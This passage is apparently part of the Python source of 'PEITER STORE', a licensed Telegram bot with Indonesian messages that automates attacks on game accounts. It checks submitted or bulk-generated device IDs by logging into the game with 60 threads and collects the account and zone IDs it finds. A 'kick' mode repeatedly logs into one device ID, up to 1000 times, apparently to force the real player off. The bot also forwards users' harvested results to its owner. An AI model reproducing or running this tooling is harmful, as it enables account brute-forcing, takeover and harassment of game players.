            {"command": "progress", "description": "📊 Progress"},
            {"command": "donate", "description": "💰 Donasi"},
            {"command": "redeem", "description": "🔑 Redeem license"},
            {"command": "mylicense", "description": "🔐 License saya"},
            {"command": "gentac", "description": "🔨 TAC Generate + Validate"},
        ]}, timeout=10)
    except: pass

    safe_print(f"[BOT] Polling started | owner={OWNER_CHAT_ID}")

    # ── MAIN LOOP (SEKALI AJA) ──
    while not _BOT_STOP.is_set():
        try:
            r = requests.get(
                f"{base}/getUpdates",
                params={"offset": _BOT_LAST_UPDATE + 1, "timeout": 25},
                timeout=35)
            data = r.json()
            if not data.get("ok"):
                time.sleep(3)
                continue

            for upd in data.get("result", []):
                _BOT_LAST_UPDATE = upd["update_id"]

                # Callback query
                if "callback_query" in upd:
                    try:
                        handle_callback(upd["callback_query"])
                    except Exception as e:
                        safe_print(f"[CB ERR] {e}")
                    continue

                # Message
                msg = upd.get("message") or upd.get("edited_message")
                if not msg:
                    continue

                chat = msg.get("chat", {})
                cid = str(chat.get("id"))
                username = chat.get("first_name") or "User"
                text = msg.get("text", "")

                # Save username
                if chat.get("username") and UNAME_STORE:
                    UNAME_STORE.save(chat.get("username"), cid)

                # Anti-flood
                if text.startswith("/"):
                    flood, cnt = check_flood(cid)
                    if flood:
                        if cid != str(OWNER_CHAT_ID):
                            _BLOCKED_USERS.add(cid)
                            save_blocked()
                            tg_send(cid, "🚫 DIBLOKIR (spam)")
                        else:
                            tg_send(cid, "⚠️ Slow down")
                        continue

                if cid in _BLOCKED_USERS and cid != str(OWNER_CHAT_ID):
                    continue

                # Document
                doc = msg.get("document")
                if doc:
                    try:
                        handle_document(cid, username, doc)
                    except Exception as e:
                        safe_print(f"[DOC ERR] {e}")
                        tg_send(cid, f"❌ {type(e).__name__}")
                    continue

                if not text:
                    continue

                # Pending states
                pending = get_pending(cid)
                if pending and not text.startswith("/"):
                    state = pending["state"]

                    if state == "don_custom":
                        clear_pending(cid)
                        try:
                            amount = int(text.strip().replace(",", "").replace(".", ""))
                        except:
                            tg_send(cid, "❌ Nominal tidak valid")
                            continue
                        min_d = QRIS_CFG.get("min_donate", 1000) if QRIS_CFG else 1000
                        if amount < min_d:
                            tg_send(cid, f"❌ Minimal Rp {min_d:,}")
                            continue
                        static_qris = QRIS_CFG.get("qris_static", "") if QRIS_CFG else ""
                        if static_qris and dn:
                            dynamic = dn.make_dynamic_qris(static_qris, amount)
                            if DONATION_TRACKER:
                                DONATION_TRACKER.add(cid, username, amount, "qris")
                            try:
                                img_bytes = dn.qris_to_image_bytes(dynamic, 400)
                                if img_bytes:
                                    files = {"photo": ("qris.png", img_bytes, "image/png")}
                                    r = requests.post(
                                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                                        files=files,
                                        data={"chat_id": cid,
                                              "caption": dn.format_donate_qris(QRIS_CFG, amount, cid),
                                              "parse_mode": "HTML",
                                              "reply_markup": json.dumps({
                                                  "inline_keyboard": dn.kb_qris_active(cid)
                                              })},
                                        timeout=30)
                                    try:
                                        resp = r.json()
                                        if resp.get("ok"):
                                            mid_qr = resp["result"]["message_id"]
                                            dn.register_qris(cid, mid_qr, amount)
                                            threading.Thread(
                                                target=_auto_expire_qris,
                                                args=(cid, mid_qr, amount),
                                                daemon=True
                                            ).start()
                                    except: pass
                                else:
                                    r = tg_api("sendMessage",
                                               chat_id=cid,
                                               text=dn.format_donate_qris(QRIS_CFG, amount, cid),
                                               parse_mode="HTML",
                                               reply_markup={"inline_keyboard": dn.kb_qris_active(cid)})
                                    try:
                                        if r.get("ok"):
                                            mid_qr = r["result"]["message_id"]
                                            dn.register_qris(cid, mid_qr, amount)
                                            threading.Thread(
                                                target=_auto_expire_qris,
                                                args=(cid, mid_qr, amount),
                                                daemon=True
                                            ).start()
                                    except: pass
                            except:
                                tg_send(cid, dn.format_donate_qris(QRIS_CFG, amount, cid))
                            tg_send(OWNER_CHAT_ID, dn.format_donate_owner_notif(cid, username, amount, "qris"))
                        continue

                    if state == "valid_manual":
                        clear_pending(cid)
                        ids = extract_device_ids(text)
                        if ids:
                            valid, lock = [], threading.Lock()
                            def _w(d):
                                try:
                                    rate_wait()
                                    acc, zid = GameLogin(d).run()
                                    with lock:
                                        if acc and zid:
                                            valid.append({"device":d,"account":acc,"zone":zid})
                                            save_valid_result(d, acc, zid)
                                except: pass
                            with concurrent.futures.ThreadPoolExecutor(max_workers=60) as ex_:
                                list(ex_.map(_w, ids))
                            tg_send(cid, f"✅ Valid: {len(valid)}/{len(ids)}")
                            if valid:
                                out = None
                                if on:
                                    out = on.make_filename(RESULTS_DIR, "valid", len(valid), ".txt")
                                    on.write_with_header(
                                        out,
                                        [f"Device id: {v['device']} | account id: {v['account']} | zone id: {v['zone']}"
                                         for v in valid],
                                        header_lines=["PEITER STORE — MANUAL VALID",
                                                      f"User ID: {cid}",
                                                      f"Username: {username}"]
                                    )
                                else:
                                    out = RESULTS_DIR / f"valid_{cid}_{int(time.time())}.txt"
                                    out.write_text("\n".join(
                                        f"Device id: {v['device']} | account id: {v['account']} | zone id: {v['zone']}"
                                        for v in valid) + "\n", encoding="utf-8")
                                tg_send_doc(cid, str(out), f"📁 {len(valid)} valid")
                                forward_batch_to_owner(cid, username, valid,
                                                        source="manual", output_file=str(out))
                        continue

                    if state == "sy_broadcast":
                        clear_pending(cid)
                        for u in list(_USER_ACCESS.keys()):
                            if u == cid: continue
                            tg_send(u, f"📢 {text}")
                            time.sleep(0.05)
                        tg_send(cid, "✅ Sent")
                        continue

                    if state == "sy_setmode":
                        clear_pending(cid)
                        m = text.strip().lower()
                        if m in ("aggressive","balanced","safe"):
                            PERFORMANCE_MODE = m
                            PROFILE = PERF_PROFILES[m]
                            tg_send(cid, f"⚡ Mode → <b>{m.upper()}</b>")
                        continue

                    if state == "mg_adduser":
                        clear_pending(cid)
                        tid = resolve_user(text)
                        if tid:
                            grant_access(tid, "user", f"owner:{cid}")
                            tg_send(cid, f"✅ User {tid}")
                        continue

                    if state == "mg_deluser":
                        clear_pending(cid)
                        tid = resolve_user(text)
                        if tid: revoke_access(tid); tg_send(cid, f"✅ {tid}")
                        continue

                    if state == "mg_addadmin":
                        clear_pending(cid)
                        tid = resolve_user(text)
                        if tid:
                            grant_access(tid, "admin", f"owner:{cid}")
                            tg_send(cid, f"✅ Admin {tid}")
                        continue

                    if state == "mg_userinfo":
                        clear_pending(cid)
                        target = text.strip()
                        tid = None
                        if UNAME_STORE: tid = UNAME_STORE.resolve(target)
                        if not tid: tid = resolve_user(target)
                        if not tid and target.isdigit(): tid = target
                        if tid and ex:
                            txt = ex.build_userinfo(tid, _USER_ACCESS, _USER_LIMITS, _BLOCKED_USERS, get_role)
                            tg_send(cid, txt)
                        else:
                            tg_send(cid, "❌ Tidak ketemu")
                        continue

                    if state == "mg_setrole":
                        clear_pending(cid)
                        parts = text.split()
                        if len(parts) < 2:
                            tg_send(cid, "❌ Format: @user ROLE")
                            continue
                        target = parts[0]; new_role = parts[1].lower()
                        valid_roles = ("owner","admin","user","trial","guest")
                        if new_role not in valid_roles:
                            tg_send(cid, "❌ Role invalid")
                            continue
                        tid = None
                        if UNAME_STORE: tid = UNAME_STORE.resolve(target)
                        if not tid: tid = resolve_user(target)
                        if not tid and target.isdigit(): tid = target
                        if tid:
                            grant_access(tid, new_role, f"owner:{cid}")
                            tg_send(cid, f"✅ {tid} → {new_role.upper()}")
                        continue

                    if state == "mg_setlimit":
                        clear_pending(cid)
                        parts = text.split()
                        if len(parts) >= 2:
                            tid = resolve_user(parts[0])
                            try: n = int(parts[1])
                            except: n = 10
                            if tid:
                                set_limit(tid, "lookup", n); set_limit(tid, "valid", n)
                                set_limit(tid, "bulk", max(1, n//2))
                                tg_send(cid, f"✅ {tid} = {n}")
                        continue

                    if state == "mg_resetlimit":
                        clear_pending(cid)
                        tid = resolve_user(text)
                        if tid: reset_limit(tid); tg_send(cid, f"✅ Reset {tid}")
                        continue

                    if state == "mg_block":
                        clear_pending(cid)
                        tid = resolve_user(text)
                        if tid:
                            _BLOCKED_USERS.add(tid); save_blocked(); revoke_access(tid)
                            tg_send(cid, f"🚫 Blocked {tid}")
                        continue

                    if state == "mg_unblock":
                        clear_pending(cid)
                        tid = text.strip()
                        if tid.startswith("@"): tid = resolve_user(tid)
                        if tid: _BLOCKED_USERS.discard(tid); save_blocked()
                        tg_send(cid, f"✅ {tid}")
                        continue

                    if state == "bf_gen":
                        clear_pending(cid)
                        parts = text.split()
                        if parts:
                            try: n = min(int(parts[0]), BF_GEN_MAX)
                            except: n = 10
                            typ = "mixed"
                            if len(parts) >= 2:
                                t = parts[1].lower()
                                if t in ("and","android"): typ = "and"
                                elif t == "ios": typ = "ios"
                            threading.Thread(target=do_gendev, args=(cid, n, typ), daemon=True).start()
                        continue

                    if state == "bf_kick":
                        clear_pending(cid)
                        parts = text.split()
                        if len(parts) >= 1:
                            did = parts[0]
                            loops = BF_KICK_MAX_LOOPS; delay = BF_KICK_DELAY
                            if len(parts) >= 2:
                                try: loops = min(int(parts[1]), 1000)
                                except: pass
                            if len(parts) >= 3:
                                try: delay = max(0.1, float(parts[2]))
                                except: pass
                            tg_send(cid, f"💥 Kick <code>{did[:50]}</code>\n🔁 {loops} | ⏱ {delay}s")
                            def _kick():
                                job_start(cid, "bfkick", loops)
                                ok = 0; fail = 0
                                for i in range(loops):
                                    if job_check(cid):
                                        tg_send(cid, f"⛔ Stop di loop {i+1}"); break
                                    try:
                                        rate_wait()
                                        acc, zid = GameLogin(did).run()
                                        if acc: ok += 1
                                        else: fail += 1
                                    except: fail += 1
                                    job_update(cid, done=i+1)
                                    time.sleep(delay)
                                job_end(cid)
                                tg_send(cid, f"💥 Selesai: ✅ {ok} | ❌ {fail}")
                            threading.Thread(target=_kick, daemon=True).start()
                        continue

                    if state == "split":
                        clear_pending(cid)
                        try:
                            n = int(text.strip())
                            lines = read_valid_lines()
                            parts = 0
                            for i in range(0, len(lines), n):
                                parts += 1
                                chunk = lines[i:i+n]
                                f = SPLIT_DIR / f"part_{parts:03d}.txt"
                                f.write_text("\n".join(chunk) + "\n", encoding="utf-8")
                            tg_send(cid, f"✂️ {parts} file")
                        except: tg_send(cid, "❌")
                        continue

                    if state == "filter":
                        clear_pending(cid)
                        if not ex:
                            tg_send(cid, "❌ Extras OFF")
                            continue
                        parsed = ex.parse_filter(text)
                        if not parsed:
                            tg_send(cid, "❌ Format: <code>device&gt;=xxx</code>")
                            continue
                        field, op, target = parsed
                        lines = read_valid_lines()
                        results = []
                        tg_send(cid, f"🔍 Filter {field} {op} {target}...")
                        for line in lines:
                            info = parse_valid_line(line)
                            if not info: continue
                            if field in ("device", "account", "zone"):
                                if ex.apply_filter(info.get(field, ""), op, target):
                                    results.append(line)
                        out = STORE_DIR / f"filter_{int(time.time())}.txt"
                        out.write_text("\n".join(results) + "\n", encoding="utf-8")
                        tg_send(cid, f"🔍 Filter: {len(results)}/{len(lines)} cocok")
                        if results:
                            tg_send_doc(cid, str(out), f"📁 {len(results)} hasil")
                        continue

                    if state == "lic_check":
                        clear_pending(cid)
                        if not lics: tg_send(cid, "❌ OFF"); continue
                        lic = lics.get_license(text.strip())
                        if not lic:
                            tg_send(cid, "❌ Tidak ditemukan", kb_license())
                            continue
                        exp = "♾ PERMANEN"
                        if lic["expires_at"]:
                            exp = datetime.fromtimestamp(lic["expires_at"], TZ_WIB).strftime("%Y-%m-%d %H:%M WIB")
                        used_by = ", ".join(lic["used_by"][:10]) or "—"
                        tg_send(cid,
                                f"🔐 <b>License Detail</b>\n"
                                f"━━━━━━━━━━━━━━━\n"
                                f"🔑 <code>{lic['key']}</code>\n"
                                f"🎭 {lic['role'].upper()}\n"
                                f"📅 {exp}\n"
                                f"👥 {lic['used_count']}/{lic['max_uses']}\n"
                                f"👤 {used_by}\n"
                                f"⚡ {'ON' if lic.get('enabled',True) else 'OFF'}",
                                kb_license())
                        continue

                    if state == "lic_delete":
                        clear_pending(cid)
                        if lics and lics.delete_license(text.strip()):
                            tg_send(cid, "✅ Dihapus", kb_license())
                        else:
                            tg_send(cid, "❌ Gagal", kb_license())
                        continue

                    if state == "lic_revoke":
                        clear_pending(cid)
                        if lics and lics.revoke_license(text.strip()):
                            tg_send(cid, "⛔ Revoked", kb_license())
                        else:
                            tg_send(cid, "❌ Gagal", kb_license())
                        continue

                # Command
                if text.startswith("/"):
                    handle_command(cid, text, username, msg)
                else:
                    tg_send(cid, "👋 Kirim file .txt atau /menu", kb_main(cid))

        except requests.exceptions.Timeout:
            continue
        except KeyboardInterrupt:
            break
        except Exception as e:
            safe_print(f"[POLL ERR] {e}")
            time.sleep(3)


# ══════════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════════
def main():
    print("=" * 64)
    print("  PEITER STORE — ULTIMATE v10 OPTIMIZED")
    print("=" * 64)
    print(f"  Token  : {BOT_TOKEN[:25]}...")
    print(f"  Owner  : {OWNER_CHAT_ID}")
    print(f"  Mode   : {PERFORMANCE_MODE.upper()}")
    print(f"  License: {'ON' if lics else 'OFF'}")
    print(f"  Extras : {'ON' if ex else 'OFF'}")
    print(f"  Donate : {'ON' if dn else 'OFF'}")
    print("=" * 64)
    print()
    print("⚠️  Powered BY @PeiterStore")
    print()

    load_state()

    try:
        r = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getMe", timeout=10)
        info = r.json()
        if info.get("ok"):
            print(f"✅ Bot valid: @{info['result'].get('username','?')}")
        else:
            print(f"❌ Invalid: {info}"); return
    except Exception as e:
        print(f"❌ {e}"); return

    print()
    print("🚀 Starting polling...")
    print()

    try:
        bot_poll()
    except KeyboardInterrupt:
        print("\n[STOP]")
        _BOT_STOP.set()


if __name__ == "__main__":
    main()